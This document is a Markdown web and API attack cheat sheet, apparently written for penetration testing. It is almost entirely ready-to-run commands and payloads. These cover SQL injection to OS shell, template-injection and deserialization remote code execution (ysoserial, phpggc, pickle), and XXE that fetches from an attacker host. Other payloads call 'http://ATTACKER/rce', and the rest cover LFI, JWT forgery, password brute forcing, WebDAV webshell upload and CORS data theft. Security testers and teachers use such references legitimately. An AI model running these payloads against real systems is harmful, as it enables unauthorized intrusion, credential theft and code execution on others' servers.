# Web Application & API Attack Reference

## Recon pipeline
```bash
# Tech detection + live probing
echo "https://target.com" | httpx-toolkit -sc -cl -title -tech-detect -fr
# Subdomain -> live host pipeline
subfinder -d target.com -silent | httpx-toolkit -sc -title -o live.txt
# Port scan web ports
naabu -host target.com -p 80,443,8080,8443,3000,5000,9090 | httpx-toolkit -sc -title
```

## Directory & file discovery
```bash
# ffuf (fastest, most flexible)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u https://target.com/FUZZ -fc 404 -t 50
ffuf -w wordlist.txt -u https://target.com/FUZZ -e .php,.html,.txt,.bak,.conf,.old -ac
# Recursive
ffuf -w wordlist.txt -u https://target.com/FUZZ -recursion -recursion-depth 3 -ac

# feroxbuster (auto-recursive, smart filtering)
feroxbuster -u https://target.com -w wordlist.txt -x php,html,txt -t 50 -d 3 --smart

# gobuster
gobuster dir -u https://target.com -w wordlist.txt -x php,html -t 50
```

## Virtual host discovery
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://target.com -H "Host: FUZZ.target.com" -fs <default-size> -ac
gobuster vhost -u https://target.com -w vhosts.txt --append-domain
```

## Parameter discovery
```bash
# arjun: find hidden parameters
arjun -u https://target.com/endpoint                  # GET
arjun -u https://target.com/endpoint -m POST          # POST
arjun -u https://target.com/api -m JSON               # JSON body
arjun -u https://target.com/api --headers "Authorization: Bearer <token>"
```

## SQL Injection
```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1" --batch --dbs
# POST data
sqlmap -u "https://target.com/login" --data "user=admin&pass=test" --batch
# With auth
sqlmap -u "https://target.com/api" --cookie "session=abc" \
  --headers "Authorization: Bearer <token>" --batch
# Escalate detection (level 3 = cookies+UA+referer, risk 3 = OR-based)
sqlmap -u "URL" --level 3 --risk 3 --batch
# Dump
sqlmap -u "URL" -D dbname -T users --dump --batch
# OS shell (stacked queries + file privs)
sqlmap -u "URL" --os-shell --batch
# WAF bypass with tamper scripts
sqlmap -u "URL" --tamper=space2comment,between --batch
# Auto-detect forms
sqlmap -u "https://target.com/login" --forms --batch --crawl=2
```

## NoSQL Injection
```bash
# graphqlmap for GraphQL endpoints
graphqlmap -u https://target.com/graphql -v

# Manual NoSQL payloads (MongoDB)
# Login bypass: {"username": {"$ne": ""}, "password": {"$ne": ""}}
# Extraction:   {"username": "admin", "password": {"$regex": "^a.*"}}
```

## Server-Side Template Injection (SSTI)
Test payloads (inject where user input is reflected):
```
{{7*7}}                          # Jinja2/Twig -> 49
${7*7}                           # Freemarker/Velocity -> 49
<%= 7*7 %>                       # ERB (Ruby) -> 49
#{7*7}                           # Pebble/Thymeleaf -> 49
```
If confirmed, escalate:
```
# Jinja2 RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
Use `nuclei -tags ssti` or `tplmap` for automated detection.

## Server-Side Request Forgery (SSRF)
Common targets for internal access:
```
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/  (cloud metadata)
http://localhost:8080/
file:///etc/passwd
```
Bypass filters: use decimal IP (`2130706433`), IPv6 (`[::1]`), DNS rebinding,
URL encoding, redirect chains.

## XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Out-of-band (blind XXE) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]>
```

### XXE in Async Pipelines
When the XXE result feeds an async consumer (Kafka, RabbitMQ, Celery):
- **NEVER** use `file:///dev/zero` or `/dev/urandom` — infinite read wedges the consumer permanently (poison message stuck at committed offset).
- **NEVER** exfil files containing NUL bytes (`/proc/self/cmdline`, `/proc/self/environ`, binary files) through lxml or libxml consumers — NUL makes invalid XML and permanently wedges the consumer.
- Stick to known text files: `/etc/passwd`, `/etc/hostname`, config files. Read small, read text-only.
- If the consumer wedges: the offset is committed, restarting the service replays the poison message. Only a topic purge or offset reset recovers.

## File Upload / LFI / RFI
```bash
# LFI path traversal
curl "https://target.com/page?file=../../../../etc/passwd"
curl "https://target.com/page?file=....//....//....//etc/passwd"  # filter bypass
# PHP wrappers
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"
# Log poisoning -> RCE (after injecting PHP in User-Agent via access log)
curl "https://target.com/page?file=/var/log/apache2/access.log"
```
File upload bypass: change extension (.php5, .phtml, .phar), content-type,
magic bytes, double extension (shell.php.jpg), null byte (shell.php%00.jpg).

## JWT Attacks
```bash
jwt_tool <TOKEN>                                  # decode
jwt_tool <TOKEN> -X a                             # none-algorithm attack
jwt_tool <TOKEN> -X k -pk public.pem              # key confusion RS->HS
jwt_tool <TOKEN> -X s -ju https://attacker/jwks   # spoof JWKS
jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt  # crack weak secret
jwt_tool <TOKEN> -I -pc role -pv admin            # inject claim
```

## WebSocket Testing
```bash
# websocat: connect to WS endpoint
websocat ws://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
# wscat
wscat -c ws://target.com/ws
wscat -c ws://target.com/ws -H "Authorization: Bearer <token>"
```

## Brute Force / Credential Attacks
```bash
# ffuf POST login brute-force
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -X POST -d "username=USER&password=PASS" \
  -u https://target.com/login -fc 401 -t 20

# hydra HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid" -t 16

# hydra HTTP Basic auth
hydra -l admin -P passwords.txt target.com http-get /admin
```

## Automated scanning
```bash
# nuclei: template-based vuln scanner
nuclei -u https://target.com -as                           # auto-detect + scan
nuclei -u https://target.com -severity critical,high       # severity filter
nuclei -u https://target.com -tags cve,sqli,xss,ssrf,lfi  # tag filter
nuclei -update-templates                                    # update DB first

# nikto: legacy but catches misconfigs
nikto -h https://target.com

# whatweb: tech fingerprinting
whatweb -a 3 https://target.com
```

## API-specific
```bash
# GraphQL introspection
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# REST API common checks
# - Try /api, /api/v1, /api/docs, /swagger.json, /openapi.json
# - Test IDOR: change numeric IDs, UUIDs in endpoints
# - Method tampering: GET->PUT/DELETE/PATCH on resources
# - Mass assignment: add extra fields in POST/PUT JSON bodies
# - Rate limiting: no limit = brute-forceable

# Wordlists for API fuzzing
# /usr/share/seclists/Discovery/Web-Content/api/
# /usr/share/seclists/Discovery/Web-Content/swagger*.txt
```

## Deserialization -- Java (ysoserial)
Identify: Java stack traces in errors, `rO0AB` base64 prefix, `.ser` files,
`Content-Type: application/x-java-serialized-object`.
```bash
# Generate payload (try multiple gadgets — depends on target's classpath)
java -jar /opt/ysoserial.jar CommonsCollections6 'curl http://ATTACKER/rce' | base64 -w0
java -jar /opt/ysoserial.jar CommonsCollections1 'ping -c1 ATTACKER' | base64 -w0

# Common gadgets to try: CommonsCollections1-7, CommonsCollections10,
# CommonsCollections13, Groovy1, Spring1, Spring2, JBossInterceptors1,
# Jdk7u21, BeanShell1, Clojure, Hibernate1, URLDNS (detection only)

# Inject: replace the serialized object in the request (cookie, POST param,
# custom header) with your payload. Base64-decode if the app expects raw bytes.
```

## Deserialization -- PHP (phpggc)
Identify: `O:4:"User":2:{...}` serialized PHP object format, or base64 of same.
```bash
# List available gadget chains
phpggc -l
phpggc -l <framework>       # e.g. phpggc -l Laravel

# Generate payload
phpggc Laravel/RCE10 system 'id'
phpggc Symfony/RCE4 exec 'curl http://ATTACKER/rce'
phpggc Monolog/RCE1 exec 'id' -b   # -b = base64 output

# Common frameworks: Laravel, Symfony, Monolog, Guzzle, WordPress, Magento,
# Doctrine, Slim, Yii, CakePHP, SwiftMailer, Phalcon
```

## Deserialization -- .NET (ysoserial.net)
Identify: ViewState blobs, `__VIEWSTATE` hidden field, SOAP/XML with .NET
type names, `AAEAAAD` base64 prefix, `BinaryFormatter` in errors.
```bash
# Generate payload (Windows tool, or run via mono/wine)
ysoserial.exe -g WindowsIdentity -f Json.Net -c 'powershell -e <b64cmd>'
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c whoami'
ysoserial.exe -g ObjectDataProvider -f Json.Net -c 'calc.exe'

# ViewState deserialization (needs machineKey from web.config leak)
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  --validationkey=<KEY> --validationalg=SHA1 \
  --generator=<GEN> --islegacy -c 'cmd /c whoami'
```

## Deserialization -- Python (pickle)
Identify: base64-decoded data starts with `\x80` (protocol marker), or
`cposix\nsystem\n` in plaintext pickle. No gadget tool needed — pickle RCE
is trivial because `__reduce__` controls deserialization.
```python
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER/rce',))
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
# Inject wherever the app unpickles user input (cookies, APIs, Redis, Celery)
```
Also check: PyYAML `yaml.load()` (use `!!python/object/apply:os.system`),
jsonpickle, shelve.

## Prototype Pollution (Node.js)
Pollute `Object.prototype` via `__proto__` or `constructor.prototype` in JSON
input. Leads to RCE when a code path reads from prototype (e.g., `child_process`
spawn options, template engine options).
```json
// Merge/assign payload (POST JSON body):
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
// Or via constructor:
{"constructor": {"prototype": {"polluted": true}}}
```
Test: inject `{"__proto__": {"test": "polluted"}}`, then check if a new
empty object `{}` has property `test`. Tools: `pp-finder`, `ppmap`.

## Type Juggling (PHP)
PHP loose comparison (`==`) treats strings starting with `0e` as float zero,
so `"0e123" == "0e456"` is true. Arrays bypass `strcmp()` (returns NULL,
which `==` treats as 0).
```
# Login bypass when password check uses == instead of ===:
password=0e123456           # if hash starts with 0e (Magic Hashes)
password[]=                 # array injection: strcmp([], hash) -> NULL == 0

# Magic hash values (md5 starts with 0e, all digits after):
240610708  -> md5: 0e462097431906509019562988736854
QNKCDZO   -> md5: 0e830400451993494058024219903391
aabg7XSs   -> md5: 0e087386482136013740957780965295
```

## WebDAV Upload
PUT method enabled on the server allows direct file upload.
```bash
# Test if PUT is allowed
curl -X OPTIONS https://target.com/ -v 2>&1 | grep -i allow

# Upload a webshell
curl -X PUT https://target.com/shell.aspx -d @shell.aspx
curl -X PUT https://target.com/shell.php --data-binary @shell.php

# cadaver (interactive WebDAV client)
cadaver https://target.com/webdav/
# > put shell.php

# davtest (auto-test upload + execution of multiple file types)
davtest -url https://target.com/webdav/
```

## CORS Misconfiguration
Reflected `Origin` in `Access-Control-Allow-Origin` with
`Access-Control-Allow-Credentials: true` → steal authenticated data cross-origin.
```bash
# Test for reflected origin
curl -s -H "Origin: https://evil.com" https://target.com/api/me -v 2>&1 \
  | grep -i 'access-control'
# If Access-Control-Allow-Origin: https://evil.com → exploitable

# Test null origin (sandboxed iframe)
curl -s -H "Origin: null" https://target.com/api/me -v 2>&1 \
  | grep -i 'access-control'
```
Exploit: host a page on attacker domain that fetches the target API with
`credentials: 'include'` → victim's browser sends cookies, response readable.

## CRLF Injection
Inject `%0d%0a` (carriage return + line feed) in URL or header values to
insert arbitrary HTTP headers or split the response.
```bash
# Test: inject a header via URL parameter
curl -v "https://target.com/redirect?url=http://target.com%0d%0aX-Injected:%20true"

# XSS via header injection (inject into Set-Cookie or reflected header)
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# Session fixation via Set-Cookie injection
%0d%0aSet-Cookie:%20session=attacker_value
```

## Open Redirect
Unvalidated redirect parameter → chain with SSRF, OAuth token theft, or
phishing (victim trusts the domain in the link).
```bash
# Common parameter names to test:
# ?url= ?redirect= ?next= ?return= ?dest= ?continue= ?redir= ?target= ?goto=

# Bypass filters:
https://target.com/redirect?url=//evil.com           # protocol-relative
https://target.com/redirect?url=https://evil.com      # direct
https://target.com/redirect?url=https://target.com@evil.com  # basic-auth trick
https://target.com/redirect?url=https://target.com.evil.com  # subdomain trick
https://target.com/redirect?url=%2F%2Fevil.com        # URL-encoded //

# Chain with OAuth: steal authorization code via redirect_uri manipulation
```

## Useful wordlists (pre-installed via seclists)
```
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Fuzzing/LFI/
/usr/share/seclists/Fuzzing/SQLi/
/usr/share/seclists/Passwords/
/usr/share/wordlists/rockyou.txt
```
